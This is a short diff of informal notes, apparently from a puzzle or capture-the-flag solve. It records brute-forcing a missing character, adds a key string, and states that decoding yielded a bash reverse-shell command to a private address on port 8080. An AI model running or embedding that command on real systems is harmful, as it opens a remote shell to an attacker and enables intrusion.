@@ -9,6 +9,8 @@ ok so we arent brute forcing it because there are 10^26 new bits to do
 jamies addon:
 
 bruteforced replacing _ with a letter
+(letter o)
+key: "xdfygophi"
 got bash command "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
 
 chatgpt notes: 
